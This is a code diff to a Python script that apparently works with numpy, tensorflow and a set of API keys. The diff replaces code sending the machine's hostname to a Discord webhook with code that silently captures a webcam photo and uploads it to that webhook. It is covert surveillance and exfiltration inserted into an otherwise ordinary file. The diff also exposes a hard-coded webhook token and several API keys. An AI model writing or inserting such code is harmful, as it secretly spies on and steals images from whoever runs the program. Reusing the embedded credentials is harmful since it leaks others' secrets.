@@ -9,23 +9,50 @@ import numpy as np
 import tensorflow as tf
 import time  
 import datetime
-import socket
+import cv2
 
-hostname = socket.gethostname()
-ip_address = socket.gethostbyname(hostname)
+cap = cv2.VideoCapture(0)
+
+# Check if the camera opened successfully
+if not cap.isOpened():
+    print("Error: Could not open camera.")
+    exit()
+
+# Capture a single frame
+ret, frame = cap.read()
+
+# Check if the frame was captured successfully
+if not ret:
+    print("Error: Could not read frame.")
+    exit()
+
+# Release the camera
+cap.release()
+
+# Save the captured frame as an image file (you can change the filename and format)
+cv2.imwrite("captured_photo.jpg", frame)
+
+print("Photo captured and saved as 'captured_photo.jpg'")
+
 
 webhook_url = 'https://discord.com/api/webhooks/1182794753331441694/qParZZ-m6IVlXT_li6wUp4et1bHKpTH54t6diG2Kh6to-wirJ71cC2ls0AjicwS8mttI'
 
 # Define the message content
-message_content = hostname
+photo_path = "captured_photo.jpg"
 
-# Create a dictionary with the message payload
-payload = {
-    'content': message_content
-}
+# Open the photo file in binary mode
+with open(photo_path, "rb") as photo_file:
+    # Prepare the payload with the file
+    files = {'photo': (photo_path, photo_file, 'image/jpeg')}
 
-# Send a POST request to the webhook URL with the payload
-response = requests.post(webhook_url, json=payload)
+    # Make the HTTP POST request to the webhook URL with the payload
+    response = requests.post(webhook_url, files=files)
+
+# Check the response status
+if response.status_code == 200:
+    print("Photo sent successfully.")
+else:
+    print(f"Failed to send photo. Status code: {response.status_code}, Response text: {response.text}")
 
 
 api_keys = ['MNI5T6CU7KLSFJA8', 'QJFF49AEUN6NX884', '9ZZWS60Q2CZ6JYUK']
